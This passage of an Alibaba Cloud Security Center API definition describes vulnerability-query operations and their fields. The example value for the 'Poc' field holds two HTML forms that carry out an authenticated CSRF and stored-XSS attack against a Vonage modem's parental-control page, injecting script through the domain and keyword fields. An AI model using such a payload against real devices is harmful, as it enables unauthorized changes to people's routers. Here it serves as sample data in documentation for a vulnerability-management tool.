      content?: string(name='Content', description='The CVE content.', example='Apache Shiro is a user authentication and authorization framework for a wide range of rights management applications.↵Recently, Apache Shiro released version 1.7.0, which fixes the Apache Shiro authentication bypass vulnerability (CVE-2020-17510).↵Attackers can bypass Shiro\\"s authentication using malicious requests containing payloads.↵↵Related bugs:↵CVE-2020-17510 Shiro < 1.7.0 Validation Bypass Vulnerability↵CVE-2020-13933 Shiro < 1.6.0 Validation Bypass Vulnerability↵CVE-2020-11989 Shiro < 1.5.3 Validation Bypass Vulnerability↵CVE-2020-1957 Shiro < 1.5.2 Validation Bypass Vulnerability↵CVE-2016-6802 Shiro < 1.3.2 Validation Bypass Vulnerability
Check whether the fastjson version currently running on the system is in the affected version and whether safeMode is configured to disable autoType. If it is in the affected version and safeMode is not configured to disable autoType, the vulnerability is considered to exist.'),
      cveId?: string(name='CveId', description='The Common Vulnerabilities and Exposures (CVE) ID.', example='CVE-2019-9167'),
      cveLink?: string(name='CveLink'),
      cvssScore?: string(name='CvssScore', description='The Common Vulnerability Scoring System (CVSS) score of the vulnerability in the Alibaba Cloud vulnerability library.', example='10.0'),
      cvssVector?: string(name='CvssVector', description='The vector that is used to calculate the CVSS score.', example='AV:N/AC:L/Au:N/C:C/I:C/A:C'),
      instanceName?: string(name='InstanceName', description='The instance name of the server.

>  This parameter is deprecated. You can call the [DescribeVulList](~~DescribeVulList~~) operation to query the instances that are affected by vulnerabilities.', example='sql-test-001'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.

>  This parameter is deprecated. You can call the [DescribeVulList](~~DescribeVulList~~) operation to query the instances that are affected by vulnerabilities.', example='47.114.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.

>  This parameter is deprecated. You can call the [DescribeVulList](~~DescribeVulList~~) operation to query the instances that are affected by vulnerabilities.', example='172.19.XX.XX'),
      otherId?: string(name='OtherId', description='The ID of the vulnerability.', example='CVE-2020-8597'),
      poc?: string(name='Poc', description='The POC content.', example='NewDomain.html
The x and y values will need to be changed accordingly
<html>
<p>Authenticated Stored CSRF/XSS - Vonage Modem</p>
<form method="POST" action="http://192.168.15.1/goform/RgParentalBasic">
<input type="hidden" name="RemoveContentRule" value="0" />
<input type="hidden" name="AddContentRule" value="0" />
<input type="hidden" name="ContentRules" value="0" />
<input type="hidden" name="RuleSelect" value="0" / >
<input type="hidden" name="NewKeyword" value="" / >
<input type="hidden" name="KeywordAction" value="0" />
<input type="hidden" name="NewDomain" value="test\\"><script>alert(1)</script>" />
<input type="hidden" name="x" value="50" />
<input type="hidden" name="y" value="15" />
<input type="hidden" name="DomainAction" value="1" />
<input type="hidden" name="AllowedDomainAction" value="0" />
<input type="hidden" name="ParentalPassword" value="Broadcom" />
<input type="hidden" name="ParentalPasswordReEnter" value="Broadcom" />
<input type="hidden" name="AccessDuration" value="30" />
<input type="submit" title="Exploit" />
</form>
</html>
 
NewKeyword.html
The x and y values will need to be changed accordingly
<html>
<p>Authenticated Stored CSRF/XSS - Vonage Modem</p>
<form method="POST" action="http://192.168.15.1/goform/RgParentalBasic">
<input type="hidden" name="RemoveContentRule" value="0" />
<input type="hidden" name="AddContentRule" value="0" />
<input type="hidden" name="ContentRules" value="0" />
<input type="hidden" name="RuleSelect" value="0" / >
<input type="hidden" name="NewKeyword" value="test\\"><script>alert(1)</script>" / >
<input type="hidden" name="x" value="61" />
<input type="hidden" name="y" value="12" />
<input type="hidden" name="KeywordAction" value="1" />
<input type="hidden" name="NewDomain" value="" />
<input type="hidden" name="DomainAction" value="0" />
<input type="hidden" name="AllowedDomainAction" value="0" />
<input type="hidden" name="ParentalPassword" value="Broadcom" />
<input type="hidden" name="ParentalPasswordReEnter" value="Broadcom" />
<input type="hidden" name="AccessDuration" value="30" />
<input type="submit" title="Enable Service" />
</form>
</html>'),
      pocCreateTime?: long(name='PocCreateTime', description='The timestamp when the proof of concept (POC) was created. Unit: milliseconds.', example='1554189334000'),
      pocDisclosureTime?: long(name='PocDisclosureTime', description='The timestamp when the POC was disclosed. Unit: milliseconds.', example='1554189334000'),
      product?: string(name='Product', description='The service that is affected by the vulnerability.', example='Log4j2'),
      reference?: string(name='Reference', description='The reference of the vulnerability in the Alibaba Cloud vulnerability library. The value is a URL.', example='https://example.com'),
      releaseTime?: long(name='ReleaseTime', description='The disclosure time that is displayed for the vulnerability in the Alibaba Cloud vulnerability library. The value is a UNIX timestamp. Unit: milliseconds.', example='1554189334000'),
      solution?: string(name='Solution', description='The fixing suggestions of the vulnerability.', example='<p>At present, Chanjet has urgently released a vulnerability patch to fix the vulnerability. CNVD recommends affected units and users to upgrade to the latest version immediately:</p>↵<p>https://www.chanjetvip.com/product/goods/goods-detail?id=53aaa40295d458e44f5d3ce5</p>↵<p>At the same time, organizations and users affected by the vulnerability are requested to immediately follow the steps below to conduct self-inspection and repair work:</p>↵<ol>↵<li><p>User self-check steps:↵<br  />Check whether website/bin/load.aspx.cdcab7d2.compiled, website/bin/App_Web_load.aspx.cdcab7d2.dll, and tplus/Load.aspx files exist locally. If they exist, it means that they have been poisoned, and you must reinstall the system and install the product. patch.</p>↵</li>↵<li><p>Non-poisoned users please:↵<br  />1) Update the latest product patch.↵<br  />2) Install anti-virus software and update the virus database in time.↵<br  />3) Upgrade the lower version of IIS and Nginx to IIS10.0 and Windows 2016.↵<br  />4) Local installation customers need to confirm whether the backup file is complete as soon as possible, and do off-site backup. Customers on the cloud should enable the mirroring function in time.↵<br  />5) Users who fail to update the patch in time can contact Chanjet technical support and take temporary preventive measures such as deleting files.</p>↵</li>↵<li><p>Poisoned users please:↵<br  />1) Check whether the server has taken regular snapshots or backups. If so, you can restore data through snapshots or backups.↵<br  />2) Contact Chanjet technical support to confirm whether it has the conditions and operation methods to restore data from backup files.</p>↵</li>↵</ol>↵<p>If you have any technical problems, please contact Chanjet technical support: 4006600566-9</p>'),
      summary?: string(name='Summary', description='The introduction to the vulnerability.', example='Chanjet T-Plus is an Internet business management software. There is an unauthorized access vulnerability in one of its interfaces disclosed on the Internet. Attackers can construct malicious requests to upload malicious files to execute arbitrary code and control the server.'),
      targetId?: string(name='TargetId', description='The ID of the asset on which the malicious image sample is detected.', example='m-bp17m0pc0xprzbwo****'),
      targetName?: string(name='TargetName', description='The name of the asset on which the malicious image sample is detected.', example='frontend'),
      title?: string(name='Title', description='The title of the vulnerability announcement.', example='Chanjet T-Plus SetupAccount/Upload. Aspx file upload vulnerability(CNVD-2022-60632)'),
      vendor?: string(name='Vendor', description='The vendor that disclosed the vulnerability.', example='Apache'),
      vulLevel?: string(name='VulLevel', description='The severity of the vulnerability. Valid value:

*   **serious**
*   **high**
*   **medium**
*   **low**', example='serious'),
    }
  ](name='Cves', description='The details of the vulnerability.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='EDA40EA3-6265-5900-AD99-C83E4F109CA8'),
}

model DescribeVulDetailsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVulDetailsResponseBody(name='body'),
}

async function describeVulDetails(request: DescribeVulDetailsRequest): DescribeVulDetailsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeVulDetails', 'POST', '/', 'json', false, 'json', request);
}

model DescribeVulExportInfoRequest {
  exportId: long(name='ExportId', description='The ID of the task.', example='14356', position='Query'),
}

model DescribeVulExportInfoResponseBody = {
  currentCount?: int32(name='CurrentCount', description='The number of exported entries.', example='1'),
  exportStatus?: string(name='ExportStatus', description='The status of the export task. Valid values:

*   **init**: The task is being initialized.
*   **exporting**: The task is in progress.
*   **success**: The task is complete.', example='success'),
  fileName?: string(name='FileName', description='The name of the exported Excel file.', example='app_20210917'),
  id?: long(name='Id', description='The ID of the task.', example='14356'),
  link?: string(name='Link', description='The URL at which you can download the exported Excel file.', example='http://www.aliyun.com'),
  message?: string(name='Message', description='The message that shows the results of the task. The value is fixed as **success**, which indicates that the task is complete.', example='success'),
  progress?: int32(name='Progress', description='The progress percentage of the task.', example='100'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='4C1AE3F3-18FA-4108-BXXX-AFA1A032756C'),
  totalCount?: int32(name='TotalCount', description='The total number of entries in the exported Excel file.', example='10'),
}

model DescribeVulExportInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVulExportInfoResponseBody(name='body'),
}

/**
  * If the value of ExportStatus is success, the URL at which you can download the exported Excel file is returned.
  *
 */
async function describeVulExportInfo(request: DescribeVulExportInfoRequest): DescribeVulExportInfoResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeVulExportInfo', 'POST', '/', 'json', false, 'json', request);
}

model DescribeVulFixStatisticsRequest {
}

model DescribeVulFixStatisticsResponseBody = {
  fixStat?: [ 
    {
      fixedTodayNum?: int32(name='FixedTodayNum', description='The number of vulnerabilities that are fixed on the current day.', example='10'),
      fixedTotalNum?: int32(name='FixedTotalNum', description='The total number of fixed vulnerabilities.', example='22'),
      fixingNum?: int32(name='FixingNum', description='The number of vulnerabilities that are being fixed.', example='17'),
      needFixNum?: int32(name='NeedFixNum', description='The number of unfixed vulnerabilities.', example='8'),
      type?: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: Linux software vulnerability
*   **sys**: Windows system vulnerability
*   **cms**: Web-CMS vulnerability
*   **app**: application vulnerability
*   **emg**: urgent vulnerability', example='cve'),
    }
  ](name='FixStat', description='An array that consists of the statistics of vulnerability fixes by vulnerability type.'),
  fixTotal?: {
    fixedTodayNum?: int32(name='FixedTodayNum', description='The number of vulnerabilities that are fixed on the current day.', example='15'),
    fixedTotalNum?: int32(name='FixedTotalNum', description='The total number of fixed vulnerabilities.', example='47'),
    fixingNum?: int32(name='FixingNum', description='The number of vulnerabilities that are being fixed.', example='22'),
    needFixNum?: int32(name='NeedFixNum', description='The number of unfixed vulnerabilities.', example='62'),
  }(name='FixTotal', description='The total statistics of vulnerability fixes.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='CE500770-42D3-442E-9DDD-156E0F9F3B45'),
}

model DescribeVulFixStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVulFixStatisticsResponseBody(name='body'),
}

async function describeVulFixStatistics(request: DescribeVulFixStatisticsRequest): DescribeVulFixStatisticsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeVulFixStatistics', 'POST', '/', 'json', false, 'json', request);
}

model DescribeVulListRequest {
  aliasName?: string(name='AliasName', description='The name of the vulnerability.', example='RHSA-2019:0230-Important: polkit security update', position='Query'),
  attachTypes?: string(name='AttachTypes', description='The additional type of the vulnerabilities. You need to specify this parameter when you query application vulnerabilities. Set the value to **sca**. If you set **Type** to **app**, you must specify this parameter.

> If you set this parameter to **sca**, application vulnerabilities and the vulnerabilities that are detected based on software component analysis are queried. If you do not specify this parameter, only application vulnerabilities are queried.', example='sca', position='Query'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1', position='Query'),
  dealed?: string(name='Dealed', description='Specifies whether the vulnerabilities are fixed. Valid values:

*   **y**: yes
*   **n**: no', example='n', position='Query'),
  groupId?: string(name='GroupId', description='The ID of the asset group.

> You can call the [DescribeAllGroups](~~DescribeAllGroups~~) operation to query the IDs of asset groups.', example='9207613', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  name?: string(name='Name', description='The alias of the vulnerability.', example='oval:com.redhat.rhsa:def:20172836', position='Query'),
  necessity?: string(name='Necessity', description='The priority to fix the vulnerability. Separate multiple priorities with commas (,). Valid values:

*   **asap**: high
*   **later**: medium
*   **nntf**: low', example='asap,later,nntf', position='Query'),
  nextToken?: string(name='NextToken', description='The pagination token that is used in the next request to retrieve a new page of results. You must specify the token that is obtained from the previous query as the value of NextToken. You do not need to specify this parameter for the first request.', example='E17B501887A2D3AA5E8360A6EFA3B***', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: **10**.', example='20', position='Query'),
  remark?: string(name='Remark', description='The remarks for the asset affected by the vulnerability. The value can be the private IP address, public IP address, or name of the asset.', example='1.2.XX.XX', position='Query'),
  resourceDirectoryAccountId?: long(name='ResourceDirectoryAccountId', description='The Alibaba Cloud account ID of the member in the resource directory.

>  You can call the [DescribeMonitorAccounts](~~DescribeMonitorAccounts~~) operation to obtain the IDs.', example='1232428423234****', position='Query'),
  statusList?: string(name='StatusList', description='The status of the vulnerability. Separate multiple statuses with commas (,). Valid values:

- 1: unfixed
- 2: fix failed
- 3: rollback failed
- 4: being fixed
- 5: being rolled back
- 6: being verified
- 7: fixed
- 8: fixed and to be restarted
- 9: rolled back
- 10: ignored
- 11: rolled back and to be restarted
- 12: not found
- 20: expired', example='1,2,3', position='Query'),
  type: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: Linux software vulnerability
*   **sys**: Windows system vulnerability
*   **cms**: Web-CMS vulnerability.
*   **app**: application vulnerability that is detected by using web scanner
*   **emg**: urgent vulnerability.
*   **sca**: application vulnerability that is detected by using software component analysis', example='cve', position='Query'),
  useNextToken?: boolean(name='UseNextToken', description='Specifies whether to use NextToken to query the data of vulnerabilities. If you set UseNextToken to true, the value of TotalCount is not returned. Valid values:

*   **true**
*   **false**', example='false', position='Query'),
  uuids?: string(name='Uuids', description='The UUIDs of the servers on which you want to query the vulnerabilities. Separate multiple UUIDs with commas (,).', example='1587bedb-fdb4-48c4-9330-****', position='Query'),
  vpcInstanceIds?: string(name='VpcInstanceIds', description='The ID of the virtual private cloud (VPC) in which the vulnerabilities are detected. Separate multiple IDs with commas (,).', example='ins-133****,ins-5414****', position='Query'),
}

model DescribeVulListResponseBody = {
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  nextToken?: string(name='NextToken', description='The value of NextToken that is returned when the NextToken method is used.', example='E17B501887A2D3AA5E8360A6EFA3B***'),
  pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='2F26AB2A-1075-488F-8472-40E5DB486ACC'),
  totalCount?: int32(name='TotalCount', description='The total number of vulnerabilities returned.', example='2'),
  vulRecords?: [ 
    {
      aliasName?: string(name='AliasName', description='The name of the vulnerability.', example='RHSA-2019:0230-Important: polkit security update'),
      authVersion?: string(name='AuthVersion', description='The edition of Security Center that is authorized to protect the asset. Valid values:

*   **1**: Basic edition
*   **6**: Anti-virus edition
*   **5**: Advanced edition
*   **3**: Enterprise edition
*   **7**: Ultimate edition
*   **10**: Value-added Plan edition', example='3'),
      bind?: boolean(name='Bind', description='Indicates whether Security Center is authorized to protect the asset. Valid values:

*   **true**
*   **false**', example='true'),
      extendContentJson?: {
        absolutePath?: string(name='AbsolutePath', description='The package path of the software that has the vulnerability.', example='/roo/www/web'),
        aliasName?: string(name='AliasName', description='The name of the vulnerability.', example='RHSA-2019:0230-Important: polkit security update'),
        description?: string(name='Description', description='The description of the vulnerability.', example='kernel version:5.10.84-10.2.al8.x86_64'),
        emgProof?: string(name='EmgProof', example='com.xxl.rpc.util.XxlRpcException: xxl-rpc request data is empty.\\n\\tat com.xxl.rpc.remoting.net.impl.servlet.serve"'),
        ip?: string(name='Ip', description='The public IP address of the asset that is associated with the vulnerability.', example='1.2.XX.XX'),
        lastTs?: long(name='LastTs', description='The timestamp that was generated when the vulnerability was last detected. Unit: milliseconds.', example='1620404763000'),
        necessity?: {
          assetsFactor?: string(name='Assets_factor', description='The asset importance score. Valid values:

*   **2**: important asset
*   **1**: common asset
*   **0**: test asset', example='1'),
          cvssFactor?: string(name='Cvss_factor', description='The Common Vulnerability Scoring System (CVSS) score.', example='7.8'),
          enviromentFactor?: string(name='Enviroment_factor', description='The environment score.', example='1.0'),
          isCalc?: string(name='Is_calc', description='Indicates whether the score of urgency to fix a vulnerability is calculated. Valid values:

*   **0**: The score is not calculated.
*   **1**: The score is calculated.', example='1'),
          status?: string(name='Status', description='The status of the score of urgency to fix a vulnerability. Valid values:

*   **none**: No score is generated.
*   **pending**: The score is to be calculated.
*   **normal**: The calculation is normal.', example='normal'),
          timeFactor?: string(name='Time_factor', description='The time score.', example='1.0'),
          totalScore?: string(name='Total_score', description='The score of urgency to fix a vulnerability.

The fixing suggestions vary based on the score of urgency of a vulnerability.

*   **\\[13.5,15]**: The vulnerability is a high-risk vulnerability. You must fix the vulnerability at the earliest opportunity.
*   **\\[7,13.5)**: The vulnerability is a medium-risk vulnerability. You can fix the vulnerability at your convenience.
*   **\\[0,7)**: The vulnerability is a low-risk vulnerability. You can ignore the vulnerability.', example='7.8'),
        }(name='Necessity', description='Indicates whether the vulnerability needs to be fixed.'),
        os?: string(name='Os', description='The name of the operating system.', example='centos'),
        osRelease?: string(name='OsRelease', description='The information about the operating system version.', example='7'),
        primaryId?: long(name='PrimaryId', description='The vulnerability ID.', example='111'),
        rpmEntityList?: [ 
          {
            containerName?: string(name='ContainerName', description='The name of the container.', example='k8s_67895c4_xxx'),
            fullVersion?: string(name='FullVersion', description='The full version number.', example='3.10.0-693.2.2.el7'),
            imageName?: string(name='ImageName', description='The name of the image.', example='registry_387ytb_xxx'),
            matchDetail?: string(name='MatchDetail', description='The reason why the vulnerability is detected.', example='python-perf version less than 0:3.10.0-693.21.1.el7'),
            matchList?: [ string ](name='MatchList', description='The rule that is used to detect the vulnerability.'),
            name?: string(name='Name', description='The name of the RPM package.', example='python-perf'),
            path?: string(name='Path', description='The path of the software that has the vulnerability.', example='/usr/lib64/python2.7/site-packages'),
            pid?: string(name='Pid', description='The process ID.', example='8664'),
            updateCmd?: string(name='UpdateCmd', description='The command that is used to fix the vulnerability.', example='*** update python-perf'),
            version?: string(name='Version', description='The package version number of the software that has the vulnerability.', example='3.10.0'),
          }
        ](name='RpmEntityList', description='The information about RPM Package Manager (RPM) packages.'),
        status?: string(name='Status', description='The status of the vulnerability. Valid values:

*   **1**: The vulnerability is unfixed.
*   **2**: The vulnerability failed to be fixed.
*   3: The system failed to be rolled back.
*   **4**: The vulnerability is being fixed.
*   **5**: The system is being rolled back.
*   **6**: The vulnerability is being verified.
*   **7**: The vulnerability is fixed.
*   **8**: The vulnerability is fixed and the system is to be restarted.
*   **9**: The system is rolled back.
*   **10**: The vulnerability is ignored.
*   **11**: The system is rolled back and is to be restarted.
*   **12**: The vulnerability is not found.
*   **20**: The vulnerability expires.', example='1'),
        tag?: string(name='Tag', description='The tag of the vulnerability.', example='oval'),
        target?: string(name='Target', example='http://39.99.XX.XX:30005/toLogin'),
        cveList?: [ string ](name='cveList', description='The CVE.'),
      }(name='ExtendContentJson', description='The extended information about the vulnerability.'),
      firstTs?: long(name='FirstTs', description='The timestamp that was generated when the vulnerability was first detected. Unit: milliseconds.', example='1554189334000'),
      groupId?: int32(name='GroupId', description='The ID of the asset group.', example='281801'),
      instanceId?: string(name='InstanceId', description='The instance ID of the asset.', example='i-bp18t***'),
      instanceName?: string(name='InstanceName', description='The name of the asset.', example='testInstance'),
      internetIp?: string(name='InternetIp', description='The public IP address of the asset.', example='1.2.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the asset.', example='1.2.XX.XX'),
      lastTs?: long(name='LastTs', description='The timestamp that was generated when the vulnerability was last detected. Unit: milliseconds.', example='1620404763000'),
      modifyTs?: long(name='ModifyTs', description='The timestamp that was generated when the vulnerability status was modified. Unit: milliseconds.', example='1620404763000'),
      name?: string(name='Name', description='The name of the vulnerability.', example='oval:com.redhat.rhsa:def:20170574'),
      necessity?: string(name='Necessity', description='The priority to fix the vulnerability. Valid values:

*   **asap**: high
*   **later**: medium
*   **nntf**: low

>  We recommend that you fix **high-level** vulnerabilities as soon as possible.', example='asap'),
      online?: boolean(name='Online', description='Indicates whether the Security Center agent of the asset is online. Valid values:

*   **true**
*   **false**', example='true'),
      osName?: string(name='OsName', description='The name of the operating system of your asset.', example='CentOS 7.2 64-bit'),
      osVersion?: string(name='OsVersion', description='The name of the operating system of your asset.', example='linux'),
      primaryId?: long(name='PrimaryId', description='The vulnerability ID.', example='101162078'),
      raspDefend?: int32(name='RaspDefend', description='Indicates whether the runtime application self-protection (RASP) feature is supported. Valid values:

*   **0**: TheRASP feature is not supported.
*   **1**: The RASP feature is supported

>  If this parameter is not returned, the RASP is not supported.', example='1'),
      raspStatus?: int32(name='RaspStatus', description='The protection mode of the RASP feature. Valid values:

*   **0**: The RASP feature is not supported.
*   **1**: The RASP feature is in Monitor mode.
*   **2**: The RASP feature is in Block mode.
*   **3**: The RASP feature is disabled.', example='1'),
      regionId?: string(name='RegionId', description='The ID of the region in which the instance resides.', example='cn-hangzhou'),
      related?: string(name='Related', description='The Common Vulnerabilities and Exposures (CVE) IDs related to the vulnerability. Multiple CVE IDs are separated by commas (,).', example='CVE-2017-7518,CVE-2017-12188'),
      repairTs?: long(name='RepairTs', description='The timestamp that was generated when the vulnerability was fixed. Unit: milliseconds.', example='1541207563000'),
      resultCode?: string(name='ResultCode', description='The code that indicates the fixing result of the vulnerability.', example='0'),
      resultMessage?: string(name='ResultMessage', description='The message that indicates the fixing result of the vulnerability.', example='timeout'),
      status?: int32(name='Status', description='The status of the vulnerability. Valid values:

*   **1**: The vulnerability is unfixed.
*   **2**: The vulnerability failed to be fixed.
*   **3**: The system failed to be rolled back.
*   **4**: The vulnerability is being fixed.
*   **5**: The system is being rolled back.
*   **6**: The vulnerability is being verified.
*   **7**: The vulnerability is fixed.
*   **8**: The vulnerability is fixed and the system is to be restarted.
*   **9**: The system is rolled back.
*   **10**: The vulnerability is ignored.
*   **11**: The system is rolled back and is to be restarted.
*   **12**: The vulnerability is not found.
*   **20**: The vulnerability expires.', example='1'),
      tag?: string(name='Tag', description='The tag of the vulnerability.', example='oval'),
      type?: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: Linux software vulnerability
*   **sys**: Windows system vulnerability
*   **cms**: Web-CMS vulnerability
*   **emg**: urgent vulnerability
*   **app**: application vulnerability
*   **sca**: application vulnerability that is detected by using Software Component Analysis (SCA).', example='cve'),
      uuid?: string(name='Uuid', description='The instance UUID of the asset.', example='04c56617-23fc-43a5-ab9b-****'),
    }
  ](name='VulRecords', description='The information about the vulnerability.'),
}

model DescribeVulListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVulListResponseBody(name='body'),
}

async function describeVulList(request: DescribeVulListRequest): DescribeVulListResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeVulList', 'POST', '/', 'json', false, 'json', request);
}

model DescribeVulListPageRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1', position='Query'),
  cveId?: string(name='CveId', description='The Common Vulnerabilities and Exposures (CVE) ID of the vulnerability.', example='CVE-2022-44702', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='10', position='Query'),
  vulNameLike?: string(name='VulNameLike', description='The name of the vulnerability.', example='RCE vulnerability', position='Query'),
}

model DescribeVulListPageResponseBody = {
  data?: [ 
    {
      cveId?: string(name='CveId', description='The common vulnerabilities and exposures (CVE) ID of the vulnerability.', example='CVE-2022-42836'),
      extAegis?: string(name='ExtAegis', description='The extended field for Server Guard.', example='{\\"relatedType\\":[{\\"type\\":\\"sys\\"}]}'),
      id?: long(name='Id', description='The primary key ID of the database.', example='40586'),
      isAegis?: int32(name='IsAegis', description='Indicates whether the vulnerability was detected based on version comparison. Valid values:

*   1: The vulnerability was detected based on version comparison.
*   0: The vulnerability was not detected based on version comparison.', example='1'),
      isSas?: int32(name='IsSas', description='Indicates whether the vulnerability was detected based on proof of concept (POC) verification. Valid values:

*   1: The vulnerability was detected based on POC verification.
*   0: The vulnerability was not detected based on POC verification.', example='0'),
      otherId?: string(name='OtherId', description='The ID of the vulnerability.', example='AVD-2018-8218'),
      releaseTime?: long(name='ReleaseTime', description='The time when the vulnerability was disclosed.', example='2022-12-13T08:00Z'),
      title?: string(name='Title', description='The name of the vulnerability.', example='Windows RCE vulnerability'),
    }
  ](name='Data', description='The response parameters.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='4347E985-6E64-467B-96EC-30D4EA9E32FB'),
  totalCount?: int32(name='TotalCount', description='The total number of entries.', example='100'),
}

model DescribeVulListPageResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVulListPageResponseBody(name='body'),
}

async function describeVulListPage(request: DescribeVulListPageRequest): DescribeVulListPageResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeVulListPage', 'POST', '/', 'json', false, 'json', request);
}

model DescribeVulNumStatisticsRequest {
  from?: string(name='From', description='The source of the request.

*   If you want to query Security Center-related data, set the value to **sas**.
*   If you want to query Server Guard-related data, you do not need to specify this parameter.', example='sas', position='Query'),
}

model DescribeVulNumStatisticsResponseBody = {
  appCnt?: int32(name='AppCnt', description='The number of application vulnerabilities that are detected on the asset by using the web scanner.', example='0'),
  appNum?: int32(name='AppNum', description='The number of application vulnerabilities that are detected on the asset by using the web scanner.', example='0'),
  cmsDealedTotalNum?: int32(name='CmsDealedTotalNum', description='The number of Web-CMS vulnerabilities that are handled.', example='0'),
  cmsNum?: int32(name='CmsNum', description='The number of Web-CMS vulnerabilities that are detected on the asset.', example='0'),
  cveNum?: int32(name='CveNum', description='The number of Linux software vulnerabilities that are detected on the asset.', example='0'),
  emgNum?: int32(name='EmgNum', description='The number of urgent vulnerabilities that are detected on the asset.', example='0'),
  requestId?: string(name='RequestId', description='The request ID.', example='E22C89D2-FE13-5800-8746-9D0EF1827A59'),
  scaNum?: int32(name='ScaNum', description='The number of middleware vulnerabilities that are detected on the asset.', example='0'),
  sysNum?: int32(name='SysNum', description='The number of Windows system vulnerabilities that are detected on the asset.', example='0'),
  vulAsapSum?: int32(name='VulAsapSum', description='The number of vulnerabilities that have the high priority.', example='0'),
  vulDealedTotalNum?: int32(name='VulDealedTotalNum', description='The number of vulnerabilities that are handled.', example='0'),
  vulLaterSum?: int32(name='VulLaterSum', description='The number of vulnerabilities that have the medium priority.', example='0'),
  vulNntfSum?: int32(name='VulNntfSum', description='The number of vulnerabilities that have the low priority.', example='0'),
}

model DescribeVulNumStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVulNumStatisticsResponseBody(name='body'),
}

async function describeVulNumStatistics(request: DescribeVulNumStatisticsRequest): DescribeVulNumStatisticsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeVulNumStatistics', 'POST', '/', 'json', false, 'json', request);
}

model DescribeVulTargetConfigRequest {
  type?: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: Linux software vulnerability
*   **sys**: Windows system vulnerability
*   **cms**: Web-CMS vulnerability
*   **emg**: urgent vulnerability', example='cve', position='Query'),
  uuid?: string(name='Uuid', description='The UUID of the server.', example='ae1527a9-2308-46ab-b10a-48ae7ff7****', position='Query'),
}

model DescribeVulTargetConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='9FBC6E47-7508-58C9-9E76-528E118CB1CC'),
  targetConfigs?: [ 
    {
      config?: string(name='Config', description='Indicates whether the vulnerability scan feature is enabled for the server.

*   **off**: disabled
*   **on**: enabled', example='on'),
      overAllConfig?: string(name='OverAllConfig', description='Indicates whether the vulnerability scan feature is enabled for all servers. Valid values:

*   **off**: disabled
*   **on**: enabled', example='on'),
      type?: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: Linux software vulnerability
*   **sys**: Windows system vulnerability
*   **cms**: Web-CMS vulnerability
*   **emg**: urgent vulnerability', example='cve'),
    }
  ](name='TargetConfigs', description='An array that consists of the configurations.'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='1'),
}

model DescribeVulTargetConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVulTargetConfigResponseBody(name='body'),
}

async function describeVulTargetConfig(request: DescribeVulTargetConfigRequest): DescribeVulTargetConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeVulTargetConfig', 'POST', '/', 'json', false, 'json', request);
}

model DescribeVulTargetStatisticsRequest {
  type?: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: Linux software vulnerability
*   **sys**: Windows system vulnerability
*   **cms**: Web-CMS vulnerability
*   **emg**: urgent vulnerability', example='cve', position='Query'),
}

model DescribeVulTargetStatisticsResponseBody = {
  currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries per page.', example='10'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='23AD0BD2-8771-5647-819E-6BA51E212F80'),
  targetStats?: [ 
    {
      targets?: [ 
        {
          flag?: string(name='Flag', description='Indicates whether the configurations are applied to the server. Valid values:

*   **add**: yes
*   **del**: no', example='add'),
          target?: string(name='Target', description='The group ID or UUID of the server to which the configurations are applied.', example='0011ea53-738c-4bff-93be-ce6a1cc9****'),
          targetType?: string(name='TargetType', description='The condition by which the configurations are applied to the server. Valid values:

*   **uuid**: the UUID of the server
*   **groupId**: the ID of the server group', example='uuid'),
        }
      ](name='Targets', description='An array that consists of available servers.'),
      totalCount?: int32(name='TotalCount', description='The total number of servers.', example='1'),
      uuidCount?: int32(name='UuidCount', description='The number of servers to which the configurations are applied.', example='1'),
      vulType?: string(name='VulType', description='The type of the vulnerability. Valid values:

*   cve: Linux software vulnerabilities
*   sys: Windows system vulnerabilities
